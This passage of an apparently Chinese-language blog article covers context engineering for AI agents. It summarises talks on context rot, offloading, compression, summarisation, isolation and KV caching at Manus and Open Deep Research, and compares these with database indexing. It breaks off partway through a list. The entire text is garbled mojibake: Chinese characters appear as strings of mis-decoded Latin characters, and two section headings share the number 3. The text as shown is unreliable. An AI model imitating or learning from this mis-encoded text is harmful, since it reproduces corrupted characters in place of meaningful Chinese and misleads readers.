<p>é—®é¢˜åœ¨äºï¼Œéšç€ä¸Šä¸‹æ–‡é•¿åº¦å¢åŠ ï¼Œæ¨¡å‹æ€§èƒ½ä¼šæ˜æ˜¾ä¸‹é™ã€‚Anthropic æŠŠè¿™ä¸ªç°è±¡ç§°ä¸º"ä¸Šä¸‹æ–‡è…çƒ‚"ï¼ˆcontext rotï¼‰ã€‚å…·ä½“è¡¨ç°æ˜¯æ¨¡å‹å¼€å§‹é‡å¤è¾“å‡ºã€æ¨ç†é€Ÿåº¦å˜æ…¢ã€å›ç­”è´¨é‡ä¸‹é™ã€‚å¤§éƒ¨åˆ†æ¨¡å‹åœ¨ 200k Token å·¦å³å°±å¼€å§‹å‡ºç°è¿™äº›é—®é¢˜ï¼Œè¿œä½äºå®ƒä»¬å®£ç§°çš„ä¸Šé™ã€‚</p>
<p>è¿™å°±å½¢æˆäº†ä¸€ä¸ªçŸ›ç›¾ï¼šæ™ºèƒ½ä½“éœ€è¦å¤§é‡ä¸Šä¸‹æ–‡æ¥ä¿æŒå·¥ä½œçŠ¶æ€çš„è¿ç»­æ€§ï¼Œä½†ä¸Šä¸‹æ–‡å¤ªé•¿åˆä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚è¿™æ˜¯æ‰€æœ‰å¼€å‘æ™ºèƒ½ä½“çš„å›¢é˜Ÿéƒ½ä¼šé‡åˆ°çš„æ ¸å¿ƒæŒ‘æˆ˜ã€‚</p>
<p>Lance åœ¨åˆ†äº«ä¸­å±•ç¤ºäº†ä»–ä»¬ Open Deep Research é¡¹ç›®çš„æ•°æ®ã€‚è¿™ä¸ªå¼€æºé¡¹ç›®åœ¨ Deep Research Bench æµ‹è¯•ä¸­æ’åå‰åï¼Œä½†å³ä½¿æ˜¯è¿™æ ·ä¼˜ç§€çš„å®ç°ï¼Œä¹Ÿéœ€è¦åœ¨ä¸‰ä¸ªé˜¶æ®µä¸­ä¸æ–­åœ°å¸è½½å’Œå‹ç¼©ä¸Šä¸‹æ–‡æ‰èƒ½ä¿æŒé«˜æ•ˆè¿è¡Œã€‚</p>
<p>Pete åˆ™åˆ†äº«äº† Manus çš„ç»éªŒã€‚ä»–ä»¬å‘ç°ï¼Œå¦‚æœä¸åšä»»ä½•ä¼˜åŒ–ï¼Œä¸Šä¸‹æ–‡ä¼šåœ¨å‡ åè½®å¯¹è¯åå°±è¾¾åˆ°æ¨¡å‹çš„å¤„ç†æé™ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œç”¨æˆ·å¾€å¾€åœ¨è¿™æ—¶æ‰å¼€å§‹è¿›å…¥ä»»åŠ¡çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜æ²¡æœ‰æ·å¾„ï¼Œå¿…é¡»ä»æ¶æ„è®¾è®¡å¼€å§‹å°±è€ƒè™‘ä¸Šä¸‹æ–‡ç®¡ç†ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ"ä¸Šä¸‹æ–‡å·¥ç¨‹"è¿™ä¸ªæ¦‚å¿µåœ¨ä»Šå¹´ 5 æœˆå¼€å§‹è¿…é€Ÿæµè¡Œçš„åŸå› ã€‚å®ƒä¸æ˜¯å¯é€‰çš„ä¼˜åŒ–é¡¹ï¼Œè€Œæ˜¯æ„å»ºç”Ÿäº§çº§æ™ºèƒ½ä½“çš„å¿…è¦æ¡ä»¶ã€‚</p>
<h2 data-id="heading-1">2. ä¸Šä¸‹æ–‡å·¥ç¨‹çš„äº”å¤§ç»„æˆéƒ¨åˆ†</h2>
<p>Lance å’Œ Pete åœ¨åˆ†äº«ä¸­ç³»ç»Ÿåœ°æ€»ç»“äº†ä¸Šä¸‹æ–‡å·¥ç¨‹çš„äº”ä¸ªæ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼Œè¿™äº›éƒ¨åˆ†ç›¸äº’å…³è”ï¼Œå½¢æˆäº†ä¸€ä¸ªå®Œæ•´çš„æŠ€æœ¯ä½“ç³»ã€‚</p>
<p>ä¸Šä¸‹æ–‡å¸è½½ æ˜¯æŠŠéƒ¨åˆ†ä¿¡æ¯ç§»å‡ºä¸»æ¶ˆæ¯å†å²ï¼Œå­˜å‚¨åˆ°å¤–éƒ¨ç³»ç»Ÿä¸­ã€‚æœ€å¸¸è§çš„æ˜¯ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿã€‚å½“æœç´¢å·¥å…·è¿”å›å¤§é‡ç»“æœæ—¶ï¼Œä¸æ˜¯æŠŠå®Œæ•´å†…å®¹æ”¾åœ¨æ¶ˆæ¯é˜Ÿåˆ—é‡Œï¼Œè€Œæ˜¯å†™å…¥æ–‡ä»¶ï¼Œåªåœ¨ä¸Šä¸‹æ–‡ä¸­ä¿ç•™æ–‡ä»¶è·¯å¾„ã€‚Claude Codeã€Manusã€Open Deep Research é¡¹ç›®éƒ½å¤§é‡ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚</p>
<p>ä¸Šä¸‹æ–‡ç¼©å‡ åŒ…æ‹¬å‹ç¼©å’Œæ‘˜è¦ä¸¤ç§ç­–ç•¥ã€‚å‹ç¼©æ˜¯å»æ‰å¯ä»¥ä»å¤–éƒ¨é‡å»ºçš„ä¿¡æ¯ï¼Œæ‘˜è¦æ˜¯å¯¹ä¿¡æ¯è¿›è¡Œä¸å¯é€†çš„ç²¾ç®€ã€‚Claude 3.5 Sonnet å·²ç»å†…ç½®äº†ä¿®å‰ªæ—§å·¥å…·è°ƒç”¨çš„åŠŸèƒ½ã€‚Cognition åœ¨æ™ºèƒ½ä½“äº¤æ¥æ—¶ä¹Ÿä¼šè§¦å‘æ‘˜è¦ã€‚</p>
<p>ä¸Šä¸‹æ–‡æ£€ç´¢ è§£å†³å¦‚ä½•æŒ‰éœ€è·å–è¢«å¸è½½çš„ä¿¡æ¯ã€‚æœ‰ä¸¤æ´¾åšæ³•ï¼šCursor ä½¿ç”¨ç´¢å¼•åŠ è¯­ä¹‰æœç´¢ï¼ŒClaude Code å’Œ Manus åªç”¨æ–‡ä»¶ç³»ç»ŸåŠ  grepã€glob è¿™æ ·çš„ç®€å•å·¥å…·ã€‚ä¸¤ç§æ–¹æ³•å„æœ‰ä¼˜åŠ£ï¼Œé€‰æ‹©å“ªç§å–å†³äºå…·ä½“åœºæ™¯ã€‚</p>
<p>ä¸Šä¸‹æ–‡éš”ç¦» é€šè¿‡å¤šæ™ºèƒ½ä½“æ¶æ„å®ç°å…³æ³¨ç‚¹åˆ†ç¦»ã€‚æ¯ä¸ªå­æ™ºèƒ½ä½“æœ‰è‡ªå·±çš„ä¸Šä¸‹æ–‡çª—å£ï¼Œé¿å…ä¿¡æ¯æ··æ‚ã€‚Manus çš„ Wide Agentsã€LangChain çš„ Deep Agentsã€Claude çš„å¤šæ™ºèƒ½ä½“ç ”ç©¶å‘˜éƒ½é‡‡ç”¨äº†è¿™ç§è®¾è®¡ã€‚</p>
<p>ä¸Šä¸‹æ–‡ç¼“å­˜ åˆ©ç”¨ KV ç¼“å­˜ç­‰æœºåˆ¶å‡å°‘é‡å¤è®¡ç®—ã€‚Anthropic ç­‰æœåŠ¡å•†æä¾›çš„ç¼“å­˜åŠŸèƒ½å¯¹é•¿ä¸Šä¸‹æ–‡æ™ºèƒ½ä½“è‡³å…³é‡è¦ï¼Œç‰¹åˆ«æ˜¯åœ¨è¾“å…¥è¿œé•¿äºè¾“å‡ºçš„åœºæ™¯ä¸‹ã€‚</p>
<p>è¿™äº”ä¸ªéƒ¨åˆ†ä¸æ˜¯ç‹¬ç«‹çš„ï¼Œè€Œæ˜¯ç›¸äº’å½±å“çš„ç³»ç»Ÿã€‚å¸è½½å’Œæ£€ç´¢è®©ç¼©å‡æ›´é«˜æ•ˆï¼Œç¨³å®šçš„æ£€ç´¢è®©éš”ç¦»å˜å¾—å®‰å…¨ã€‚ä½†éš”ç¦»ä¼šå‡æ…¢ä¸Šä¸‹æ–‡ä¼ é€’ï¼Œé™ä½ç¼©å‡é¢‘ç‡ã€‚æ›´å¤šçš„éš”ç¦»å’Œç¼©å‡åˆä¼šå½±å“ç¼“å­˜æ•ˆç‡ã€‚</p>
<p>Pete ç‰¹åˆ«å¼ºè°ƒï¼Œè¿™ç§ç›¸äº’ä¾èµ–æ„å‘³ç€ä½ ä¸èƒ½åªä¼˜åŒ–æŸä¸€ä¸ªæ–¹é¢ï¼Œå¿…é¡»ä»æ•´ä½“è€ƒè™‘ã€‚æ¯”å¦‚ï¼Œå¦‚æœä½ çš„æ£€ç´¢æœºåˆ¶ä¸å¤Ÿç¨³å®šï¼Œå°±ä¸èƒ½æ¿€è¿›åœ°è¿›è¡Œä¸Šä¸‹æ–‡éš”ç¦»ï¼Œå¦åˆ™å­æ™ºèƒ½ä½“å¯èƒ½æ— æ³•è·å–å¿…è¦çš„ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-2">3. ä¸Šä¸‹æ–‡ç®¡ç†å’Œæ•°æ®åº“ç³»ç»Ÿçš„å¯¹æ¯”</h2>
<p>åœ¨åˆ†äº«ä¸­æˆ‘ä¸ªäººçš„æ„Ÿè§‰æ˜¯ä¸Šä¸‹æ–‡å·¥ç¨‹çš„è®¾è®¡å’Œæ•°æ®åº“ç³»ç»Ÿè®¾è®¡æœ‰æ¯”è¾ƒå¤šçš„ç›¸ä¼¼æ€§ã€‚</p>
<p>ä¸Šä¸‹æ–‡å¸è½½å’Œæ•°æ®åº“ç´¢å¼•æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä½†å®ƒä»¬çš„è®¾è®¡ç›®æ ‡å’Œå®ç°æœºåˆ¶å­˜åœ¨æœ¬è´¨å·®å¼‚ã€‚</p>
<p>å±•å¼€æ¥è®²ï¼šç›¸ä¼¼æ€§æ˜¯éƒ½æ˜¯ä¸ºäº†è§£å†³å®¹é‡ä¸æ€§èƒ½çš„çŸ›ç›¾</p>
<p>æ•°æ®åº“ç´¢å¼•è§£å†³çš„æ˜¯ã€Œå¦‚ä½•åœ¨æµ·é‡æ•°æ®ä¸­å¿«é€Ÿå®šä½ã€çš„é—®é¢˜ï¼Œè€Œä¸Šä¸‹æ–‡å¸è½½è§£å†³çš„æ˜¯ã€Œå¦‚ä½•åœ¨æœ‰é™çª—å£ä¸­è®¿é—®æ— é™ä¿¡æ¯ã€çš„é—®é¢˜ã€‚ä¸¤è€…éƒ½æ˜¯é€šè¿‡å»ºç«‹æŸç§é—´æ¥å¼•ç”¨æœºåˆ¶ï¼Œè®©ç³»ç»Ÿèƒ½å¤Ÿå¤„ç†è¶…å‡ºç›´æ¥å¤„ç†èƒ½åŠ›çš„æ•°æ®é‡ã€‚</p>
<p>æ•°æ®åº“æœ‰å†…å­˜ä¸­çš„ç´¢å¼•é¡µã€ç£ç›˜ä¸Šçš„ç´¢å¼•æ–‡ä»¶ã€ä»¥åŠå®é™…çš„æ•°æ®é¡µã€‚ä¸Šä¸‹æ–‡å·¥ç¨‹ä¹Ÿæœ‰ç±»ä¼¼çš„å±‚æ¬¡ï¼šæ´»è·ƒä¸Šä¸‹æ–‡ï¼ˆç›¸å½“äºå†…å­˜ä¸­çš„çƒ­æ•°æ®ï¼‰ã€æ–‡ä»¶è·¯å¾„å¼•ç”¨ï¼ˆç›¸å½“äºç´¢å¼•ï¼‰ã€æ–‡ä»¶ç³»ç»Ÿä¸­çš„å®Œæ•´å†…å®¹ï¼ˆç›¸å½“äºç£ç›˜æ•°æ®ï¼‰ã€‚</p>
<p>æ•°æ®åº“ç´¢å¼•é’ˆå¯¹ä¸åŒçš„æŸ¥è¯¢æ¨¡å¼æœ‰ä¸åŒç±»å‹ï¼šB æ ‘ç´¢å¼•é€‚åˆèŒƒå›´æŸ¥è¯¢ï¼Œå“ˆå¸Œç´¢å¼•é€‚åˆç­‰å€¼æŸ¥è¯¢ï¼Œå…¨æ–‡ç´¢å¼•é€‚åˆæ–‡æœ¬æœç´¢ã€‚ä¸Šä¸‹æ–‡å¸è½½ä¹Ÿæœ‰ç±»ä¼¼çš„åˆ†ç±»ï¼šä»£ç æ–‡ä»¶ç”¨è·¯å¾„ç´¢å¼•ï¼Œæœç´¢ç»“æœç”¨è¯­ä¹‰å‘é‡ç´¢å¼•ï¼Œå¯¹è¯å†å²ç”¨æ—¶é—´æˆ³ç´¢å¼•ã€‚</p>
<p>æ•°æ®åº“çš„ buffer pool ä¼šç¼“å­˜é¢‘ç¹è®¿é—®çš„ç´¢å¼•é¡µå’Œæ•°æ®é¡µã€‚ä¸Šä¸‹æ–‡å·¥ç¨‹ä¸­çš„ KV ç¼“å­˜ä¹Ÿä¼šä¿ç•™é¢‘ç¹å¼•ç”¨çš„ä¸Šä¸‹æ–‡ç‰‡æ®µã€‚ä¸¤è€…éƒ½ä½¿ç”¨ LRU æˆ–ç±»ä¼¼ç®—æ³•å†³å®šæ·˜æ±°ç­–ç•¥ã€‚</p>
<p>å…³é”®å·®å¼‚ï¼šç´¢å¼•æ˜¯æŸ¥è¯¢ä¼˜åŒ–ï¼Œå¸è½½æ˜¯å®¹é‡ç®¡ç†</p>
<p>æ•°æ®åº“ç´¢å¼•çš„ä¸»è¦ç›®æ ‡æ˜¯åŠ é€ŸæŸ¥è¯¢ï¼Œå³ä½¿æ²¡æœ‰ç´¢å¼•ï¼Œå…¨è¡¨æ‰«æä¹Ÿèƒ½å¾—åˆ°ç»“æœï¼Œåªæ˜¯æ…¢ä¸€äº›ã€‚è€Œä¸Šä¸‹æ–‡å¸è½½æ˜¯ä¸ºäº†çªç ´ç¡¬æ€§é™åˆ¶ï¼Œæ²¡æœ‰å¸è½½æœºåˆ¶ï¼Œè¶…å‡ºçª—å£çš„ä¿¡æ¯å°±å®Œå…¨æ— æ³•è®¿é—®ã€‚è¿™æ˜¯ã€Œä¼˜åŒ–ã€ä¸ã€Œå¿…éœ€ã€çš„åŒºåˆ«ã€‚</p>
<p>æ•°æ®åº“ç´¢å¼•æ˜¯å†—ä½™ä¿¡æ¯ï¼Œåˆ é™¤ç´¢å¼•ä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œåªä¼šå½±å“æŸ¥è¯¢æ€§èƒ½ã€‚ä½†ä¸Šä¸‹æ–‡å¸è½½ä¸­ï¼Œå¦‚æœæ–‡ä»¶ç³»ç»Ÿä¸­çš„å†…å®¹ä¸¢å¤±ï¼Œè€Œä¸Šä¸‹æ–‡ä¸­åªæœ‰è·¯å¾„å¼•ç”¨ï¼Œä¿¡æ¯å°±æ°¸ä¹…ä¸¢å¤±äº†ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Pete å¼ºè°ƒå¸è½½å¿…é¡»é…åˆå¯é çš„æ£€ç´¢æœºåˆ¶ã€‚</p>
<p>æ•°æ®åº“ç´¢å¼•éœ€è¦éšæ•°æ®æ›´æ–°è€Œç»´æŠ¤ï¼Œè¿™æ˜¯ ACID äº‹åŠ¡çš„ä¸€éƒ¨åˆ†ã€‚è€Œä¸Šä¸‹æ–‡å¸è½½é€šå¸¸æ˜¯å•å‘çš„ï¼šä¿¡æ¯ä»ä¸Šä¸‹æ–‡ç§»åˆ°å¤–éƒ¨å­˜å‚¨ï¼Œå¾ˆå°‘éœ€è¦åå‘æ›´æ–°ã€‚å³ä½¿æ–‡ä»¶å†…å®¹è¢«ä¿®æ”¹ï¼Œä¸Šä¸‹æ–‡ä¸­çš„å¼•ç”¨é€šå¸¸ä¿æŒä¸å˜ã€‚</p>
<p>æ•°æ®åº“å¯ä»¥é€‰æ‹©æ€§åœ°ä¸ºæŸäº›åˆ—å»ºç«‹ç´¢å¼•ï¼ŒåŸºäºæŸ¥è¯¢æ¨¡å¼å’Œæ•°æ®åˆ†å¸ƒåšå†³ç­–ã€‚è€Œä¸Šä¸‹æ–‡å¸è½½å¾€å¾€æ˜¯å¼ºåˆ¶çš„ï¼šå½“æ¥è¿‘ Token é™åˆ¶æ—¶ï¼Œå¿…é¡»å¸è½½æŸäº›å†…å®¹ï¼Œæ²¡æœ‰"ä¸å»ºç´¢å¼•"çš„é€‰é¡¹ã€‚</p>
<p>å°±åƒæ•°æ®åº“æœ‰å†…å­˜ã€ç£ç›˜ã€ç¼“å­˜çš„å±‚æ¬¡ç»“æ„ï¼Œä¸Šä¸‹æ–‡å·¥ç¨‹ä¹Ÿæœ‰ç±»ä¼¼çš„åˆ†å±‚ï¼šæ´»è·ƒä¸Šä¸‹æ–‡ï¼ˆå†…å­˜ï¼‰ã€æ–‡ä»¶ç³»ç»Ÿï¼ˆç£ç›˜ï¼‰ã€KV ç¼“å­˜ï¼ˆç¼“å­˜å±‚ï¼‰ã€‚æ•°æ®åº“çš„æŸ¥è¯¢ä¼˜åŒ–å¯¹åº”ç€ä¸Šä¸‹æ–‡æ£€ç´¢ï¼Œäº‹åŠ¡éš”ç¦»å¯¹åº”ç€æ™ºèƒ½ä½“éš”ç¦»ï¼Œæ•°æ®å‹ç¼©å¯¹åº”ç€ä¸Šä¸‹æ–‡å‹ç¼©ã€‚</p>
<p>Pete æåˆ°çš„"é€šè¿‡é€šä¿¡"å’Œ"é€šè¿‡å…±äº«å†…å­˜"ä¸¤ç§æ¨¡å¼ï¼Œå®é™…ä¸Šå¯¹åº”ç€æ•°æ®åº“ä¸­çš„æ¶ˆæ¯ä¼ é€’å’Œå…±äº«å­˜å‚¨ä¸¤ç§æ¶æ„ã€‚å½“å­æ™ºèƒ½ä½“éœ€è¦å®Œæ•´å†å²è®°å½•æ—¶ï¼Œä½¿ç”¨å…±äº«ä¸Šä¸‹æ–‡æ¨¡å¼ï¼Œè¿™å°±åƒæ•°æ®åº“ä¸­çš„å…±äº«å­˜å‚¨æ¶æ„ã€‚å½“ä»»åŠ¡ç›¸å¯¹ç‹¬ç«‹æ—¶ï¼Œä½¿ç”¨é€šä¿¡æ¨¡å¼ï¼Œç±»ä¼¼äºåˆ†å¸ƒå¼æ•°æ®åº“çš„æ¶ˆæ¯ä¼ é€’ã€‚</p>
<p>æ™ºèƒ½ä½“é—´çš„çŠ¶æ€åŒæ­¥é—®é¢˜ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€è‡´æ€§é—®é¢˜ã€‚</p>
<p>Manus çš„è§£å†³æ–¹æ¡ˆä¹Ÿå€Ÿé‰´äº†æ•°æ®åº“çš„è®¾è®¡æ€æƒ³ã€‚ä»–ä»¬ä½¿ç”¨ç»“æ„åŒ–çš„æ¨¡å¼ï¼ˆschemaï¼‰æ¥å®šä¹‰æ™ºèƒ½ä½“é—´çš„é€šä¿¡æ¥å£ï¼Œç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§ã€‚ä»–ä»¬çš„åˆ†å±‚è¡Œä¸ºç©ºé—´è®¾è®¡ï¼ˆå‡½æ•°è°ƒç”¨ã€æ²™ç›’å·¥å…·ã€è½¯ä»¶åŒ…ä¸APIï¼‰ç±»ä¼¼äºæ•°æ®åº“çš„å­˜å‚¨å¼•æ“åˆ†å±‚ã€‚</p>
<p>è¿™ç§ç±»æ¯”ä¸ä»…ä»…æ˜¯ç†è®ºä¸Šçš„ç›¸ä¼¼ã€‚åœ¨å®è·µä¸­ï¼Œä½ å¯ä»¥ç›´æ¥åº”ç”¨æ•°æ®åº“ç³»ç»Ÿçš„å¾ˆå¤šä¼˜åŒ–æŠ€æœ¯ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨ LRU ç­–ç•¥å†³å®šå“ªäº›ä¸Šä¸‹æ–‡åº”è¯¥è¢«å‹ç¼©æˆ–æ‘˜è¦ï¼›ä½¿ç”¨é¢„å†™æ—¥å¿—ï¼ˆWALï¼‰çš„æ€æƒ³ï¼Œåœ¨æ‘˜è¦å‰å…ˆæŠŠå®Œæ•´ä¸Šä¸‹æ–‡å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼›ä½¿ç”¨ç´¢å¼•æ¥åŠ é€Ÿæ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¿¡æ¯æ£€ç´¢ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å€Ÿé‰´æ•°æ®åº“é¢†åŸŸå‡ åå¹´çš„ç ”ç©¶æˆæœå’Œå·¥ç¨‹å®è·µï¼Œè€Œä¸æ˜¯ä»é›¶å¼€å§‹æ‘¸ç´¢ã€‚</p>
<h2 data-id="heading-3">3. ä¸Šä¸‹æ–‡å·¥ç¨‹çš„æ ¸å¿ƒæ˜¯åšå‡æ³•ï¼Œè€Œä¸æ˜¯åŠ æ³•</h2>
<p>Pete åœ¨åˆ†äº«æœ€åå¼ºè°ƒçš„è¿™ä¸€ç‚¹å¯èƒ½æ˜¯æœ€é‡è¦çš„ï¼šé¿å…ä¸Šä¸‹æ–‡è¿‡åº¦å·¥ç¨‹ï¼ˆcontext over-engineeringï¼‰ã€‚</p>
<p>ä»–æåˆ°ï¼ŒManus ä¸Šçº¿å…­ä¸ƒä¸ªæœˆä»¥æ¥ï¼Œæœ€å¤§çš„æ€§èƒ½æå‡ä¸æ˜¯æ¥è‡ªå¢åŠ æ›´å¤æ‚çš„ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ï¼Œè€Œæ˜¯æ¥è‡ªç®€åŒ–æ¶æ„ã€ç§»é™¤ä¸å¿…è¦çš„åŠŸèƒ½ã€å¯¹æ¨¡å‹ç»™äºˆæ›´å¤šä¿¡ä»»ã€‚ä»–ä»¬å·²ç»é‡æ„äº† Manus äº”æ¬¡ï¼Œæ¯æ¬¡éƒ½æ˜¯åœ¨åšå‡æ³•ã€‚</p>
<p>æ¯”å¦‚ï¼Œæ—©æœŸçš„ Manus ä½¿ç”¨ todo.md æ–‡ä»¶æ¥ç®¡ç†ä»»åŠ¡åˆ—è¡¨ï¼Œç»“æœå‘ç°çº¦ä¸‰åˆ†ä¹‹ä¸€çš„æ“ä½œéƒ½åœ¨æ›´æ–°è¿™ä¸ªåˆ—è¡¨ï¼Œæµªè´¹äº†å¤§é‡ Tokenã€‚åæ¥ä»–ä»¬æ”¹ç”¨æ›´ç®€å•çš„ç»“æ„åŒ–è§„åˆ’å™¨ï¼Œæ•ˆæœåè€Œæ›´å¥½ã€‚</p>
<p>å¦ä¸€ä¸ªä¾‹å­æ˜¯å·¥å…·é€‰æ‹©ã€‚ä»–ä»¬æ²¡æœ‰ä½¿ç”¨å¤æ‚çš„è¯­ä¹‰æœç´¢æ¥åŠ¨æ€åŠ è½½å·¥å…·ï¼Œè€Œæ˜¯å›ºå®šä½¿ç”¨ 10-20 ä¸ªåŸå­åŠŸèƒ½ï¼Œå…¶ä»–æ‰€æœ‰åŠŸèƒ½éƒ½é€šè¿‡æ²™ç›’ä¸­çš„å‘½ä»¤è¡Œå·¥å…·æˆ– Python è„šæœ¬æ¥å®ç°ã€‚è¿™ç§åˆ†å±‚çš„è¡Œä¸ºç©ºé—´è®¾è®¡ï¼Œè®©ç³»ç»Ÿæ—¢çµæ´»åˆç®€å•ã€‚</p>
<p>Pete è¿˜æåˆ°äº†ä¸€ä¸ªè¯„ä¼°æ¶æ„çš„æ–¹æ³•ï¼šåœ¨å¼ºå¼±æ¨¡å‹ä¹‹é—´åˆ‡æ¢æµ‹è¯•ã€‚å¦‚æœä½ çš„æ¶æ„ä»å¼±æ¨¡å‹åˆ‡æ¢åˆ°å¼ºæ¨¡å‹åèƒ½è·å¾—æ˜æ˜¾æå‡ï¼Œè¯´æ˜æ¶æ„æœ‰è¾ƒå¥½çš„æœªæ¥é€‚åº”æ€§ã€‚å› ä¸ºæ˜å¹´çš„å¼±æ¨¡å‹å¯èƒ½å°±å’Œä»Šå¤©çš„å¼ºæ¨¡å‹ä¸€æ ·å¥½ã€‚</p>
<p>å…³äºæ˜¯å¦è¦è®­ç»ƒä¸“é—¨çš„æ¨¡å‹ï¼ŒPete çš„è§‚ç‚¹ä¹Ÿå¾ˆæ˜ç¡®ï¼šåˆåˆ›å…¬å¸åº”è¯¥å°½å¯èƒ½é•¿æ—¶é—´åœ°ä¾èµ–é€šç”¨æ¨¡å‹å’Œä¸Šä¸‹æ–‡å·¥ç¨‹ã€‚è®­ç»ƒä¸“é—¨æ¨¡å‹ä¸ä»…æˆæœ¬é«˜ï¼Œè€Œä¸”åœ¨äº§å“å¿«é€Ÿè¿­ä»£çš„é˜¶æ®µï¼Œå¾ˆå¯èƒ½åœ¨ä¼˜åŒ–é”™è¯¯çš„æŒ‡æ ‡ã€‚MCPï¼ˆModel Context Protocolï¼‰çš„æ¨å‡ºå°±æ˜¯ä¸ªä¾‹å­ï¼Œå®ƒå½»åº•æ”¹å˜äº† Manus çš„è®¾è®¡ï¼Œå¦‚æœä¹‹å‰æŠ•å…¥å¤§é‡èµ„æºè®­ç»ƒä¸“é—¨æ¨¡å‹ï¼Œè¿™äº›æŠ•å…¥å°±æµªè´¹äº†ã€‚</p>
<p>ä»–ä»¬ç°åœ¨ä¹Ÿä¸ä½¿ç”¨å¼€æºæ¨¡å‹ï¼Œä¸æ˜¯å› ä¸ºè´¨é‡é—®é¢˜ï¼Œè€Œæ˜¯æˆæœ¬é—®é¢˜ã€‚å¯¹äºè¾“å…¥è¿œé•¿äºè¾“å‡ºçš„æ™ºèƒ½ä½“åº”ç”¨ï¼ŒKV ç¼“å­˜è‡³å…³é‡è¦ã€‚å¤§å‹äº‘æœåŠ¡å•†æœ‰æ›´å¥½çš„åˆ†å¸ƒå¼ç¼“å­˜åŸºç¡€è®¾æ–½ï¼Œç®—ä¸‹æ¥ä½¿ç”¨ä»–ä»¬çš„ API åè€Œæ›´ä¾¿å®œã€‚</p>
<p>è¿™äº›ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼šä¸Šä¸‹æ–‡å·¥ç¨‹çš„ç›®æ ‡æ˜¯è®©æ¨¡å‹çš„å·¥ä½œå˜å¾—æ›´ç®€å•ï¼Œè€Œä¸æ˜¯æ›´å¤æ‚ã€‚ä¸è¦ä¸ºäº†ä¼˜åŒ–è€Œä¼˜åŒ–ï¼Œæ¯ä¸ªè®¾è®¡å†³ç­–éƒ½è¦åŸºäºå®é™…çš„æ€§èƒ½æ•°æ®å’Œç”¨æˆ·åé¦ˆã€‚</p>
<h2 data-id="heading-4">4. å‹ç¼©ä¸æ‘˜è¦çš„æœ¬è´¨åŒºåˆ«å†³å®šäº†ä½¿ç”¨ç­–ç•¥</h2>
<p>Pete è¯¦ç»†è§£é‡Šäº†å‹ç¼©å’Œæ‘˜è¦è¿™ä¸¤ç§çœ‹ä¼¼ç›¸ä¼¼å®åˆ™æˆªç„¶ä¸åŒçš„ç­–ç•¥ï¼Œè¿™ä¸ªåŒºåˆ†å¯¹å®é™…åº”ç”¨è‡³å…³é‡è¦ã€‚</p>
<p>å‹ç¼©æ˜¯å¯é€†çš„ã€‚åœ¨ Manus ä¸­ï¼Œæ¯ä¸ªå·¥å…·è°ƒç”¨éƒ½æœ‰å®Œæ•´æ ¼å¼å’Œç´§å‡‘æ ¼å¼ã€‚æ¯”å¦‚å†™æ–‡ä»¶æ“ä½œï¼Œå®Œæ•´æ ¼å¼åŒ…å«è·¯å¾„å’Œå†…å®¹ï¼Œç´§å‡‘æ ¼å¼åªä¿ç•™è·¯å¾„ã€‚å› ä¸ºæ–‡ä»¶å·²ç»å­˜åœ¨äºæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œé€šè¿‡è·¯å¾„å¯ä»¥éšæ—¶æ¢å¤å®Œæ•´ä¿¡æ¯ã€‚è¿™ç§å¯é€†æ€§è‡³å…³é‡è¦ï¼Œå› ä¸ºä½ æ°¸è¿œä¸çŸ¥é“å“ªä¸ªå†å²æ“ä½œä¼šåœ¨åç»­å˜å¾—é‡è¦ã€‚</p>
<p>æ‘˜è¦æ˜¯ä¸å¯é€†çš„ã€‚ä¸€æ—¦æ‰§è¡Œæ‘˜è¦ï¼ŒåŸå§‹ä¿¡æ¯å°±æ°¸ä¹…ä¸¢å¤±äº†ã€‚å› æ­¤å¿…é¡»éå¸¸è°¨æ…ã€‚Manus çš„åšæ³•æ˜¯åœ¨æ‘˜è¦å‰å°†å®Œæ•´ä¸Šä¸‹æ–‡è½¬å‚¨ä¸ºæ—¥å¿—æ–‡ä»¶ï¼Œä½œä¸ºæœ€åçš„ä¿é™©ã€‚è€Œä¸”æ‘˜è¦æ—¶è¦ä¿ç•™æœ€æ–°å‡ æ¬¡å·¥å…·è°ƒç”¨çš„å®Œæ•´ä¿¡æ¯ï¼Œè®©æ¨¡å‹çŸ¥é“å½“å‰çš„å·¥ä½œçŠ¶æ€ã€‚</p>
<p>å…³äºé˜ˆå€¼çš„ç¡®å®šï¼ŒPete åˆ†äº«äº†å…·ä½“æ•°æ®ï¼šå¤§å¤šæ•°æ¨¡å‹åœ¨ 200k Token å·¦å³å¼€å§‹å‡ºç°æ€§èƒ½ä¸‹é™ï¼Œä»–ä»¬å°† 128k-200k è®¾å®šä¸º"è…çƒ‚å‰"é˜ˆå€¼ã€‚è¿™ä¸æ˜¯éšæ„è®¾å®šçš„ï¼Œè€Œæ˜¯é€šè¿‡å¤§é‡è¯„ä¼°å¾—å‡ºçš„ã€‚ä»–ä»¬æµ‹è¯•äº†ä¸åŒé•¿åº¦ä¸‹æ¨¡å‹çš„é‡å¤ç‡ã€æ¨ç†é€Ÿåº¦ã€è¾“å‡ºè´¨é‡ç­‰æŒ‡æ ‡ã€‚</p>
<p>è§¦å‘ç­–ç•¥æ˜¯æ¸è¿›å¼çš„ï¼š</p>
<ul>
<li>æ¥è¿‘ 128k æ—¶ï¼Œå¼€å§‹å‹ç¼©æœ€æ—§çš„ 50% å·¥å…·è°ƒç”¨</li>
